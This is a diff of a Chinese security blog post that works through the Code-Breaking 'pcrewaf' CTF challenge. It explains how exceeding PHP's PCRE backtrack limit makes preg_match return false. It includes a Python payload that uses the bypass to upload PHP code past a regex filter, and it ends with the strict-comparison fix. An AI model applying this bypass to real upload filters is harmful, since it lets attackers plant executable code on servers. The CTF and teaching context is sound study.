@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="正则表达式,bypass,">
 
 
 
@@ -79,13 +79,25 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Boogle&#39;s Blogs">
-<meta property="og:url" content="http://boogle.github.io/tags/phpmyadmin/index.html">
+<meta name="description" content="0x00 前言起源于CODEBREAKING中一个ctf题目  easy - pcrewaf1234567891011121314151617181920&amp;lt;?phpfunction is_php($data)&amp;#123;    return preg_match(&apos;/&amp;lt;\?.*[(`;?&amp;gt;].*/is&apos;, $data);&amp;#125;if(empty($_FILES)) &amp;#123">
+<meta name="keywords" content="正则表达式,bypass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bypass PCREWAF">
+<meta property="og:url" content="http://boogle.github.io/2019/03/10/Bypass-PCREWAF/index.html">
 <meta property="og:site_name" content="Boogle&#39;s Blogs">
+<meta property="og:description" content="0x00 前言起源于CODEBREAKING中一个ctf题目  easy - pcrewaf1234567891011121314151617181920&amp;lt;?phpfunction is_php($data)&amp;#123;    return preg_match(&apos;/&amp;lt;\?.*[(`;?&amp;gt;].*/is&apos;, $data);&amp;#125;if(empty($_FILES)) &amp;#123">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="https://i.loli.net/2019/03/10/5c84838e186fa.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/10/5c8483b0a34d5.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/10/5c848672a232d.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/10/5c84882491e42.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/10/5c84890e8b30e.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/10/5c848a7415b9b.png">
+<meta property="og:updated_time" content="2019-03-10T04:03:38.979Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Boogle&#39;s Blogs">
+<meta name="twitter:title" content="Bypass PCREWAF">
+<meta name="twitter:description" content="0x00 前言起源于CODEBREAKING中一个ctf题目  easy - pcrewaf1234567891011121314151617181920&amp;lt;?phpfunction is_php($data)&amp;#123;    return preg_match(&apos;/&amp;lt;\?.*[(`;?&amp;gt;].*/is&apos;, $data);&amp;#125;if(empty($_FILES)) &amp;#123">
+<meta name="twitter:image" content="https://i.loli.net/2019/03/10/5c84838e186fa.png">
 
 
 
@@ -115,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://boogle.github.io/tags/phpmyadmin/">
+  <link rel="canonical" href="http://boogle.github.io/2019/03/10/Bypass-PCREWAF/">
 
 
 
 
 
-  <title>Tag: phpmyadmin | Boogle's Blogs</title>
+  <title>Bypass PCREWAF | Boogle's Blogs</title>
   
 
 
@@ -140,7 +152,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -266,52 +278,221 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>phpmyadmin<small>Tag</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://boogle.github.io/2019/03/10/Bypass-PCREWAF/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="boogle">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/boogle.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Boogle's Blogs">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/12/25/phpmyadmin4-8-0-4-8-3任意文件包含/" itemprop="url">
-              
-                <span itemprop="name">phpmyadmin4.8.0~4.8.3任意文件包含payload</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">Bypass PCREWAF</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-12-25T14:01:50+08:00" content="2018-12-25">
-          12-25
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-10T11:59:04+08:00">
+                2019-03-10
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>起源于CODEBREAKING中一个ctf题目  <a href="https://code-breaking.com/puzzle/2/" target="_blank" rel="noopener">easy - pcrewaf</a><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (is_php($data)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    @mkdir($user_dir, <span class="number">0755</span>);</span></span><br><span class="line"><span class="php">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h2><p>题目大意为向服务器写入一个php文件，但是文件内容收到了限制<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_match</span><span class="params">(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, <span class="variable">$data</span>)</span></span></span><br></pre></td></tr></table></figure></p>
+<p>正则匹配了php标签，也就是说我们无法写入php代码，常规绕过思路是使用ASP标签<code>&lt;% %&gt;</code>或者script PHP标签<code>&lt;script language=&quot;php&quot;&gt;</code>来区分php代码，但是题目环境使用php7版本，这两种标签均被移除。<br><img src="https://i.loli.net/2019/03/10/5c84838e186fa.png" alt></p>
+<p><img src="https://i.loli.net/2019/03/10/5c8483b0a34d5.png" alt></p>
+<p>这里，PHITHON大神提到了一种很好的方式：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
+<h2 id="0x02-利用pcre-backtrack-limit限制绕过pcrewaf"><a href="#0x02-利用pcre-backtrack-limit限制绕过pcrewaf" class="headerlink" title="0x02 利用pcre.backtrack_limit限制绕过pcrewaf"></a>0x02 利用pcre.backtrack_limit限制绕过pcrewaf</h2><p>常见正则有两种匹配形式</p>
+<ul>
+<li>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</li>
+<li>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</li>
+</ul>
+<p>而php所使用的pcre库则采用了NFA方式</p>
+<p>那么何为回溯呢？这里以此题的正则为例匹配<code>&lt;?php phpinfo();//booglewadwdadadwad</code><br><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&lt;\?.*<span class="comment">[(`;?&gt;]</span>.*/<span class="keyword">is</span></span><br></pre></td></tr></table></figure></p>
+<p>当其执行到第一个<code>.*</code>时，它会匹配到后面所有的内容<br><img src="https://i.loli.net/2019/03/10/5c848672a232d.png" alt><br>而继续执行到 <code>[(;?&gt;]</code>时，前面匹配的全部内容显然不符合，此时便会进行回溯。直到匹配到<code>;</code>时符合条件<br><img src="https://i.loli.net/2019/03/10/5c84882491e42.png" alt></p>
+<p>那么这里便有一个问题，如果回溯时无关字符无限长，那么岂不是会导致正则永远无法执行完成，导致正则dos。<br>其实为了防止这种情况的发生，pcre对回溯次数做了限制，默认配置回溯次数<code>pcre.backtrack_limit</code>为1000000次。<br><img src="https://i.loli.net/2019/03/10/5c84890e8b30e.png" alt><br>当回溯次数超过一百万次时，会返回<code>false</code>,那么这个题目便可构造超长的回溯次数使其返回<code>false</code>绕过文件内容检查。</p>
+<h2 id="0x03-payload"><a href="#0x03-payload" class="headerlink" title="0x03 payload"></a>0x03 payload</h2><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">from io <span class="keyword">import</span> BytesIO</span><br><span class="line">from hashlib <span class="keyword">import</span> md5</span><br><span class="line">file = &#123;</span><br><span class="line">	<span class="string">'file'</span>:BytesIO(b<span class="string">'&lt;?php phpinfo();//'</span>+b<span class="string">'a'</span>*<span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.111.139:8088/'</span></span><br><span class="line">r=requests.post(url=url,files=file)</span><br><span class="line">m = md5()</span><br><span class="line">m.update(<span class="string">'192.168.111.1'</span>)</span><br><span class="line"><span class="built_in">path</span> = <span class="string">'/data/'</span>+m.hexdigest()</span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> xrange(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">	u = url+<span class="built_in">path</span>+<span class="string">'/'</span>+str(i)+<span class="string">'.php'</span></span><br><span class="line">	res = requests.get(u)</span><br><span class="line">	<span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">		print u</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/03/10/5c848a7415b9b.png" alt></p>
+<h2 id="0x04-修复方法"><a href="#0x04-修复方法" class="headerlink" title="0x04 修复方法"></a>0x04 修复方法</h2><p>题目中使用了<code>preg_match</code>对字符串匹配，采用<code>===</code>判断返回值<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_php($input) === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="params">...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2019/03/10/Bypass-PCREWAF/">Bypass PCREWAF</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 boogle 的个人博客">boogle</a></p>
+  <p><span>发布时间:</span>2019年03月10日 - 11:59</p>
+  <p><span>最后更新:</span>2019年03月10日 - 12:03</p>
+  <p><span>原始链接:</span><a href="/2019/03/10/Bypass-PCREWAF/" title="Bypass PCREWAF">http://boogle.github.io/2019/03/10/Bypass-PCREWAF/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://boogle.github.io/2019/03/10/Bypass-PCREWAF/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
 
       
     </div>
 
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/正则表达式/" rel="tag"><i class="fa fa-tag"></i> 正则表达式</a>
+          
+            <a href="/tags/bypass/" rel="tag"><i class="fa fa-tag"></i> bypass</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/06/从http协议层面和数据库层面绕过waf/" rel="next" title="从http协议层面和数据库层面绕过waf">
+                <i class="fa fa-chevron-left"></i> 从http协议层面和数据库层面绕过waf
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -319,6 +500,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -339,8 +524,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -435,6 +629,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-题目分析"><span class="nav-number">2.</span> <span class="nav-text">0x01 题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-利用pcre-backtrack-limit限制绕过pcrewaf"><span class="nav-number">3.</span> <span class="nav-text">0x02 利用pcre.backtrack_limit限制绕过pcrewaf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-payload"><span class="nav-number">4.</span> <span class="nav-text">0x03 payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-修复方法"><span class="nav-number">5.</span> <span class="nav-text">0x04 修复方法</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -573,6 +783,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
